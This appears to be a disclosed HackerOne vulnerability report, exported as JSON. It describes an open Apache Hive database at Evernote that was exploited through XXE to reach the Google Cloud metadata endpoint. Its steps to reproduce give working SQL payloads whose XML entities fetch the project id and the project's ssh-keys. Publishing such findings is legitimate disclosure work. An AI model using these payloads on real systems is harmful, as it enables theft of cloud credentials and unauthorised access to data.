{
  "id": 742808,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NDI4MDg=",
  "url": "https://hackerone.com/reports/742808",
  "title": "Non-production Open Database In Combination With XXE Leads To SSRF",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2019-11-21T00:27:31.178Z",
  "submitted_at": "2019-11-21T00:27:31.178Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "kaulse",
    "url": "/kaulse",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/t2dv1343ltj9dxffhu3ibpp9kboc/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%2245340011.png%22%3B%20filename%2A%3DUTF-8%27%2745340011.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSC2BV6P%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T084026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDBIYb02bdmQriBWFQCEt2NO%2BhKeraB1Qpp81%2FB0i9PpAIgHE%2BQf3yAo0CZ%2FZ3u4XKtRCYh4rXLiTb1MJbcg0gdWxAqsgUIEBADGgwwMTM2MTkyNzQ4NDkiDCXH8kDWzUxqHWFGdSqPBTU8%2FsCyCfLOsQWZ0n8Vwyc49u2ZrgqAwWPscpryNaiw1d89b1p6tHxiVdX6ZHTu55X%2FmXPMu3l2kl9iEv3sv6fR5NB3AS2601G1Aufr23nWvSUWxu193vVfMoRmlrE%2BwNiG%2FX5RQWLr8xCt43VvqxD1VwBJ1%2FRn3f7YRpNEyFPcpVD%2FZSbzgRJ7ycQykB9d3KUkHYh%2FgnnBxcIyBMa2WQuglu%2BPQdV3k%2FWawLxCd1jZqacsxjIsp%2FgVzSoYMdLXDtKdM3ANmASZNZjoaaX4r5M%2BpkUvnhhqFy%2FDPBxmmKDto9anAWsN781BmRlDy5RZO9eZNMWGIYRVcvSk75POfwWIHN0RXGfWg31SHJyzDAZSZOM3Kagl3mkYvmR1mlxl%2F7Wxdxkr9gMjbvH%2FvUmYIl%2FMuIe9UTIVtEXJof3GHP8ozEi4QYwBwGxBI%2F9UeeUT7KthQIbNkpzeImvDRLpkiJTvIku0EClCKE3HomU65erQsoEPwp0Z%2B1KDSdn2y6%2F8B3f12AmMNytEdVTsfpYsJwHpa5ldrCOtv56n6YyUIOMlSmauNd3YAXISEUDWEAvR%2BitCjK02JztBXQAx6E%2FVSAOEfGRUhUUvTfG4MNJfiZFtS3EkZMHtNXOPxH%2BKHwRZLJBIemfk3GNle%2B6ve8CA0v%2BmBSZufZn0bhOSZJSj8JEFXx%2BSVrX9sLN6LL1zsxTwhsCgIBz1t1VTb5%2FYmnsFKEonTNk2L6nSGyKh0E6OxW0Gpv6LXQI%2BbOulfsaMevlpPCK0x3UzZZVhkt9uKAc6sSTYU3ZYxCaT96B1x8AU9cVFetiUS%2FS%2BpJ7KFcDdmg7NxmmR82rqk%2F95Q11hkdNrcvflKU1naXYYR3RaGVQOPn4wsLi%2BxgY6sQHcA8FyNn5BdDkdxWC6Pvkk0Ms0ZxKd%2BmExljJyCpvOJX4hl7PqcQMC6ZWa7lwCx7N3rC19UTcW8KZ7tiezB5sRqVb7a4ttSTZVJLtpt2HKYTnln5CyIMIQ%2BDW6W84g2neFcrtV5IAZBqjMUCtNRur2Gxi9ge8uKY4ZZBVtf47zz%2Fjw55UfZHZofZPDiKeq8Af8oShnRDlX93IqEBMsD5epUFmbTEBefGgEfdSr%2FXAJKio%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=843ae813402705b6d0caf0c24e75e365a1a991087a68dd9d0fa6a4972003277e"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 44211,
    "url": "https://hackerone.com/evernote",
    "handle": "evernote",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/9jjpi96bDMknk4JEkhSEyk8z/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/9jjpi96bDMknk4JEkhSEyk8z/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Evernote",
      "twitter_handle": "",
      "website": "http://evernote.com",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-10-27T15:20:40.726Z",
  "bug_reporter_agreed_on_going_public_at": "2020-09-07T13:45:22.108Z",
  "team_member_agreed_on_going_public_at": "2020-10-27T15:20:40.543Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nThe Apache Hive database hosted on the IP ██████████ and open on port 10000 is open and vulnerable to XXE.\nBy \"open\", I mean that the database can be accessed by anyone.\n\n## Steps To Reproduce:\nChose any database client that supports Apache Hive and also uses a specific client version. \"Specific client version\" because you will otherwise get an error which looks like this:\n```\n13:22:26.077 [main] ERROR org.apache.hive.jdbc.HiveConnection - Error opening session\norg.apache.hive.org.apache.thrift.TApplicationException: Required field 'client_protocol' is unset! Struct:TOpenSessionReq(client_protocol:null, configuration:{set:hiveconf:hive.server2.thrift.resultset.default.fetch.size=1000, use:database=default})\n```\n  1. Chose a database client and connect to mentioned IP and port\n  2. Execute the following SQL payload:\n\n```SQL\nselect xpath_string('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1beta1/project/project-id\"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;\n```\nThe query above will return the associated project id which is \"en-development\".\n\n## Supporting Material/References:\nI will list some interesting information that I queried below.\n\n**Query**\n```SQL\nselect xpath_string('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys\"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;\n```\n**Response**\n```\n████\n█████\n██████████\n█████████\n██████\n██████████\n██████\n████████\n████\n████\n████████\n███████\n█████████\n███████\n██████\n█████\n███\n███\n████\n████████\n██████\n█████████\n███████\n██████████\n█████████\n████\n█████████\n████\n██████████\n█████\n██████████\n█████\n████████\n██████████\n██████\n██████████\n█████\n█████\n██████\n██████████\n█████\n███\n████\n```\n\n## Impact\n\nAccess to the GCP project via the Google Cloud metadata endpoint which leads to access to at least the Google Cloud storage buckets and Google Cloud BigTable/BigQuery.",
  "weakness": {
    "id": 54,
    "name": "XML External Entities (XXE)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 24,
  "voters": [
    "th3hidd3nmist",
    "nytr0gen",
    "sourc7",
    "mainteemoforfun",
    "rook1337",
    "kaulse",
    "rahul-kadavil",
    "0nlymohammed",
    "hundredpercent",
    "hell1337",
    "and 14 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 754019,
    "asset_type": "OTHER",
    "asset_identifier": "VDP Reports",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 24982,
      "category": "researcher",
      "content": "Due to a misconfigured database, it was possible to access Evernote's Google Cloud account which had access permissions to the Google Cloud products BigQuery, BigTable and Google Cloud Storage. Hence, the severity is critical.\nThe report is out of scope for the BBP program as it's on Evernote's developer environment instead of the production one.",
      "updated_at": "2020-10-23T14:26:59.441Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 21083,
        "username": "kaulse",
        "name": "Sébastien",
        "bio": "Security Researcher",
        "cleared": false,
        "verified": false,
        "website": "https://securitydiscovery.com/",
        "location": "Germany",
        "created_at": "2015-04-25T16:58:10.191Z",
        "url": "https://hackerone.com/kaulse",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/t2dv1343ltj9dxffhu3ibpp9kboc/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%2245340011.png%22%3B%20filename%2A%3DUTF-8%27%2745340011.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSC2BV6P%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T084026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDBIYb02bdmQriBWFQCEt2NO%2BhKeraB1Qpp81%2FB0i9PpAIgHE%2BQf3yAo0CZ%2FZ3u4XKtRCYh4rXLiTb1MJbcg0gdWxAqsgUIEBADGgwwMTM2MTkyNzQ4NDkiDCXH8kDWzUxqHWFGdSqPBTU8%2FsCyCfLOsQWZ0n8Vwyc49u2ZrgqAwWPscpryNaiw1d89b1p6tHxiVdX6ZHTu55X%2FmXPMu3l2kl9iEv3sv6fR5NB3AS2601G1Aufr23nWvSUWxu193vVfMoRmlrE%2BwNiG%2FX5RQWLr8xCt43VvqxD1VwBJ1%2FRn3f7YRpNEyFPcpVD%2FZSbzgRJ7ycQykB9d3KUkHYh%2FgnnBxcIyBMa2WQuglu%2BPQdV3k%2FWawLxCd1jZqacsxjIsp%2FgVzSoYMdLXDtKdM3ANmASZNZjoaaX4r5M%2BpkUvnhhqFy%2FDPBxmmKDto9anAWsN781BmRlDy5RZO9eZNMWGIYRVcvSk75POfwWIHN0RXGfWg31SHJyzDAZSZOM3Kagl3mkYvmR1mlxl%2F7Wxdxkr9gMjbvH%2FvUmYIl%2FMuIe9UTIVtEXJof3GHP8ozEi4QYwBwGxBI%2F9UeeUT7KthQIbNkpzeImvDRLpkiJTvIku0EClCKE3HomU65erQsoEPwp0Z%2B1KDSdn2y6%2F8B3f12AmMNytEdVTsfpYsJwHpa5ldrCOtv56n6YyUIOMlSmauNd3YAXISEUDWEAvR%2BitCjK02JztBXQAx6E%2FVSAOEfGRUhUUvTfG4MNJfiZFtS3EkZMHtNXOPxH%2BKHwRZLJBIemfk3GNle%2B6ve8CA0v%2BmBSZufZn0bhOSZJSj8JEFXx%2BSVrX9sLN6LL1zsxTwhsCgIBz1t1VTb5%2FYmnsFKEonTNk2L6nSGyKh0E6OxW0Gpv6LXQI%2BbOulfsaMevlpPCK0x3UzZZVhkt9uKAc6sSTYU3ZYxCaT96B1x8AU9cVFetiUS%2FS%2BpJ7KFcDdmg7NxmmR82rqk%2F95Q11hkdNrcvflKU1naXYYR3RaGVQOPn4wsLi%2BxgY6sQHcA8FyNn5BdDkdxWC6Pvkk0Ms0ZxKd%2BmExljJyCpvOJX4hl7PqcQMC6ZWa7lwCx7N3rC19UTcW8KZ7tiezB5sRqVb7a4ttSTZVJLtpt2HKYTnln5CyIMIQ%2BDW6W84g2neFcrtV5IAZBqjMUCtNRur2Gxi9ge8uKY4ZZBVtf47zz%2Fjw55UfZHZofZPDiKeq8Af8oShnRDlX93IqEBMsD5epUFmbTEBefGgEfdSr%2FXAJKio%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=843ae813402705b6d0caf0c24e75e365a1a991087a68dd9d0fa6a4972003277e",
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/t2dv1343ltj9dxffhu3ibpp9kboc/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%2245340011.png%22%3B%20filename%2A%3DUTF-8%27%2745340011.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSC2BV6P%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T084026Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDBIYb02bdmQriBWFQCEt2NO%2BhKeraB1Qpp81%2FB0i9PpAIgHE%2BQf3yAo0CZ%2FZ3u4XKtRCYh4rXLiTb1MJbcg0gdWxAqsgUIEBADGgwwMTM2MTkyNzQ4NDkiDCXH8kDWzUxqHWFGdSqPBTU8%2FsCyCfLOsQWZ0n8Vwyc49u2ZrgqAwWPscpryNaiw1d89b1p6tHxiVdX6ZHTu55X%2FmXPMu3l2kl9iEv3sv6fR5NB3AS2601G1Aufr23nWvSUWxu193vVfMoRmlrE%2BwNiG%2FX5RQWLr8xCt43VvqxD1VwBJ1%2FRn3f7YRpNEyFPcpVD%2FZSbzgRJ7ycQykB9d3KUkHYh%2FgnnBxcIyBMa2WQuglu%2BPQdV3k%2FWawLxCd1jZqacsxjIsp%2FgVzSoYMdLXDtKdM3ANmASZNZjoaaX4r5M%2BpkUvnhhqFy%2FDPBxmmKDto9anAWsN781BmRlDy5RZO9eZNMWGIYRVcvSk75POfwWIHN0RXGfWg31SHJyzDAZSZOM3Kagl3mkYvmR1mlxl%2F7Wxdxkr9gMjbvH%2FvUmYIl%2FMuIe9UTIVtEXJof3GHP8ozEi4QYwBwGxBI%2F9UeeUT7KthQIbNkpzeImvDRLpkiJTvIku0EClCKE3HomU65erQsoEPwp0Z%2B1KDSdn2y6%2F8B3f12AmMNytEdVTsfpYsJwHpa5ldrCOtv56n6YyUIOMlSmauNd3YAXISEUDWEAvR%2BitCjK02JztBXQAx6E%2FVSAOEfGRUhUUvTfG4MNJfiZFtS3EkZMHtNXOPxH%2BKHwRZLJBIemfk3GNle%2B6ve8CA0v%2BmBSZufZn0bhOSZJSj8JEFXx%2BSVrX9sLN6LL1zsxTwhsCgIBz1t1VTb5%2FYmnsFKEonTNk2L6nSGyKh0E6OxW0Gpv6LXQI%2BbOulfsaMevlpPCK0x3UzZZVhkt9uKAc6sSTYU3ZYxCaT96B1x8AU9cVFetiUS%2FS%2BpJ7KFcDdmg7NxmmR82rqk%2F95Q11hkdNrcvflKU1naXYYR3RaGVQOPn4wsLi%2BxgY6sQHcA8FyNn5BdDkdxWC6Pvkk0Ms0ZxKd%2BmExljJyCpvOJX4hl7PqcQMC6ZWa7lwCx7N3rC19UTcW8KZ7tiezB5sRqVb7a4ttSTZVJLtpt2HKYTnln5CyIMIQ%2BDW6W84g2neFcrtV5IAZBqjMUCtNRur2Gxi9ge8uKY4ZZBVtf47zz%2Fjw55UfZHZofZPDiKeq8Af8oShnRDlX93IqEBMsD5epUFmbTEBefGgEfdSr%2FXAJKio%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cbaa875e6b3b547c09e9966542d2c653ce12bdadb103411a9101fc0d90a14c36",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTUzOTE3NiwicHVyIjoiYmxvYl9pZCJ9fQ==--96f4f8c41ca8a095752fafcec07c7d943147c3ac/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c155082ce6f9751dcb29cd6ea061a7e4d7329577/45340011.png"
        }
      }
    }
  ]
}
